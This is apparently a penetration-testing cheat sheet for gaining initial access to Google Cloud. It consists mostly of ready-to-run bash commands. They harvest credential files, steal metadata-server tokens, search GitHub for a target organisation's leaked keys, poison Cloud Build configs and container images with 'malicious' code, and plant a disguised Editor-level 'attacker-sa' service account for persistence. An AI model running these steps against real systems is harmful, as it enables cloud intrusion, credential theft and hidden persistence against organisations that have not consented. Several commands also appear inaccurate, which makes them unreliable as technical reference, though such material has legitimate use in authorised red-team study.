# GCP Initial Access

Techniques for obtaining initial access to Google Cloud Platform environments.

## Credential Enumeration

### Find GCP Credentials on Systems

```bash
# Check common credential locations
cat ~/.config/gcloud/properties
cat ~/.config/gcloud/configurations/config_*
ls -la ~/.config/gcloud/active_plugins/
ls -la ~/.config/gcloud/legacy_credentials/

# Look for service account JSON files
find ~ -name "*.json" | xargs grep -l "type.*service_account" 2>/dev/null

# Check environment variables
env | grep -i gcloud
env | grep -i google
env | grep -i service

# Search for credentials in code repositories
grep -r "client_secret\|client_id\|service_account" .git/ --include="*.json"

# Check gcloud configuration
gcloud config list

# Check for service account emails in bash history
cat ~/.bash_history | grep -i "serviceaccount"

# Look in common backup/config locations
ls /var/lib/google*/
ls ~/.docker/config.json
cat ~/.docker/config.json | jq '.auths'
```

### Extract Service Account Keys

```bash
# List all service accounts in project
gcloud iam service-accounts list --project={projectId}

# Get service account details
gcloud iam service-accounts describe {serviceAccount}@{projectId}.iam.gserviceaccount.com

# If you have keys, check expiration
gcloud iam service-accounts keys list \
  --iam-account={serviceAccount}@{projectId}.iam.gserviceaccount.com

# Extract all user service account keys (if they have iam.serviceAccountKeys.get permission)
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  gcloud iam service-accounts keys list --iam-account=$SA --format="json" | jq '.[] | select(.validAfterTime != null)'
done
```

## Workload Identity Abuse

### Compromise GKE to GCP Access Chain

```bash
# From compromised GKE pod
SERVICEACCOUNT=default
NAMESPACE=default
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Query GCP API using pod's workload identity
curl -H "Authorization: Bearer $TOKEN" \
  -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience={projectId}.iam.gserviceaccount.com

# Use the identity token to get GCP credentials
curl -X POST \
  -H "Content-Type: application/json" \
  https://sts.googleapis.com/v1/token \
  -d '{
    "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
    "audience": "//iam.googleapis.com/projects/{projectNumber}/locations/global/workloadIdentityPools/{pool}/providers/{provider}",
    "requested_token_use": "access_token",
    "subject_token": "'${TOKEN}'",
    "subject_token_type": "urn:ietf:params:oauth:token-type:jwt"
  }'

# Or directly access GCP services from pod
gcloud auth application-default login
gcloud projects list
gcloud compute instances list --project={projectId}
```

### Abuse Cloud Build Service Account

```bash
# Cloud Build runs as a service account with elevated permissions
# If you can trigger a build, you can execute code with its privileges

# Get Cloud Build service account
PROJECT_ID=$(gcloud config get-value project)
PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format="value(projectNumber)")
BUILD_SA="${PROJECT_NUMBER}@cloudbuild.gserviceaccount.com"

# Check what permissions this account has
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:${BUILD_SA}"

# Trigger a build with your code
# Cloud Build will execute it as the build service account
cat > cloudbuild.yaml << 'EOF'
steps:
  - name: 'gcr.io/cloud-builders/gcloud'
    args: ['iam', 'roles', 'list', '--project=${PROJECT_ID}']
  - name: 'gcr.io/cloud-builders/gke-deploy'
    args: ['run', '--filename=.', '--location=us-central1', '--cluster=prod-cluster']
EOF

gcloud builds submit --config=cloudbuild.yaml .
```

## Public IP & API Exposure

### Find Exposed GCP APIs

```bash
# Check which APIs are enabled
gcloud services list --enabled --project={projectId}

# Identify potentially exploitable APIs
# Cloud SQL Admin, Compute Engine, Deployment Manager, etc.

# Check service accounts with public access
gcloud compute instances list --filter="status:RUNNING" --format="table(name,externalIp)"

# Check for compute instances with public IPs that might have exposed ports
gcloud compute instances list --format="json" | jq '.[] | {name, externalIp}'

# Scan for open ports on public GCP instances
for instance in $(gcloud compute instances list --format="value(name)"); do
  EXTERNAL_IP=$(gcloud compute instances describe $instance --format="value(networkInterfaces[0].accessConfigs[0].natIp)")
  echo "=== $instance ($EXTERNAL_IP) ==="
  nmap -p 22,3306,5432,3389,8080,8443 $EXTERNAL_IP
done
```

### Exploit Cloud Run with Public Access

```bash
# Cloud Run services can have public access and often contain application vulnerabilities
gcloud run list --platform=managed --format="json"

# Check which services are public
gcloud run list --platform=managed --format="json" | jq '.[] | {name, traffic: .status.traffic}'

# Target vulnerable public Cloud Run services
# Often vulnerable to:
# - Insecure deserialization
# - SSRF attacks
# - SQL injection
# - Path traversal

# If authentication is not enforced, call directly
curl https://vulnerable-service-{random}.run.app/admin

# If it requires authentication but has weak token validation
TOKEN=$(gcloud auth print-identity-token)
curl -H "Authorization: Bearer $TOKEN" https://vulnerable-service.run.app/admin
```

## OAuth & Service Account Key Exposure

### Find Exposed Service Account Keys in GitHub

```bash
# Search GitHub for exposed GCP service account files
curl -s "https://api.github.com/search/code?q=type:service_account+org:{target-org}" | jq '.items[].repository.clone_url'

# Download and extract
git clone https://github.com/{target}/{repo}
find . -name "*.json" | xargs grep -l "type.*service_account"

# The JSON key includes:
# - private_key: Used for service account JWT signing
# - client_email: The service account email
# - client_id: Unique identifier
```

### Use Exposed Service Account Key

```bash
# Authenticate with the private key
gcloud auth activate-service-account --key-file=service-account.json

# Check what permissions this account has
gcloud projects get-iam-policy {projectId} --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:{email}"

# The service account now has full GCP access per its IAM role
# Can enumerate and access resources

gcloud compute instances list
gcloud sql instances list
gcloud storage buckets list
gcloud secrets list
```

## Metadata Service Abuse

### Google Cloud Metadata Service

```bash
# From any GCP compute instance, the metadata service is accessible
# Contains instance credentials and sensitive information

# Get service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get service account email
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Use token to access GCP API
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r '.access_token')

curl -H "Authorization: Bearer $TOKEN" \
  https://www.googleapis.com/compute/v1/projects/{projectId}/zones/us-central1-a/instances

# Get instance metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true

# Common credentials in metadata
# - Service account access tokens
# - SSH keys
# - Startup scripts
# - Project ID and zone info
```

## Misconfigured Cloud IAM

### Cross-Project Access

```bash
# Check if service account can access other projects
# Service accounts can sometimes have permissions across projects

gcloud config set project {target-project}
gcloud compute instances list  # May work even with different project

# If error mentions permission denied, the account doesn't have access
# But check the specific error - sometimes it reveals project structure

# Check for shared services/databases
gcloud sql instances list --project={other-project}  # If service account has cross-project role

# Look for shared Google Cloud Storage buckets
gcloud storage buckets list  # May include buckets from other projects
```

### Abuse Primitive Roles

```bash
# Check if service account has primitive roles
# Primitive roles (Owner, Editor, Viewer) grant broad permissions

gcloud projects get-iam-policy {projectId} --flatten="bindings[].members" | grep serviceAccount

# Editor role allows:
# - Create and modify any GCP resource
# - Delete resources
# - Modify IAM policies
# - Access all APIs

# If you have Editor:
gcloud iam roles list  # See all available roles
gcloud projects set-iam-policy {projectId} policy.json  # Modify IAM
```

## Supply Chain Attacks

### Compromised Cloud Build Source

```bash
# Cloud Build automatically triggers on code push
# If you can modify build configuration, you can run arbitrary code

# Modify cloudbuild.yaml
cat > cloudbuild.yaml << 'EOF'
steps:
  - name: 'gcr.io/cloud-builders/docker'
    args: ['build', '-t', 'gcr.io/$PROJECT_ID/malicious', '.']
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/$PROJECT_ID/malicious']
  - name: 'gcr.io/cloud-builders/kubectl'
    args: ['set', 'image', 'deployment/app', 'app=gcr.io/$PROJECT_ID/malicious']
    env: ['CLOUDSDK_COMPUTE_ZONE=us-central1-a', 'CLOUDSDK_CONTAINER_CLUSTER=prod']
EOF

git add cloudbuild.yaml
git commit -m "Update build config"
git push

# Cloud Build executes as its service account
# Your malicious code runs with those permissions
```

### Artifact Registry Container Poisoning

```bash
# If you have push access to Artifact Registry
# You can poison container images

# Authenticate to Artifact Registry
gcloud auth configure-docker us-central1-docker.pkg.dev

# Create malicious image
docker build -t us-central1-docker.pkg.dev/{project}/containers/app:v1.1 .

# Push as update
docker push us-central1-docker.pkg.dev/{project}/containers/app:v1.1

# Next deployment pulls your malicious image
# Runs with application's service account permissions
```

## Domain-based Initial Access

### Organization Policy Bypass

```bash
# Check organization policies
gcloud resource-manager org-policies list --project={projectId}

# Some policies can be temporarily disabled
# If you have resourcemanager.organizationPolicies.setPolicy permission

# Check policy constraints
gcloud resource-manager org-policies describe \
  --project={projectId} \
  constraints/compute.requireShieldedVm

# If policy enforcement is weak, you might bypass it
# Deploy unshielded VMs or use other restricted resources
```

## Persistence via Initial Access

```bash
# After gaining initial access, establish persistence
# Via additional credentials or configuration

# Create additional service account
gcloud iam service-accounts create attacker-sa \
  --display-name="Backup Service Account"

# Grant it sufficient permissions
gcloud projects add-iam-policy-binding {projectId} \
  --member=serviceAccount:attacker-sa@{projectId}.iam.gserviceaccount.com \
  --role=roles/editor

# Generate key for later access
gcloud iam service-accounts keys create attacker-key.json \
  --iam-account=attacker-sa@{projectId}.iam.gserviceaccount.com

# This key persists even if original compromised account is deleted
```
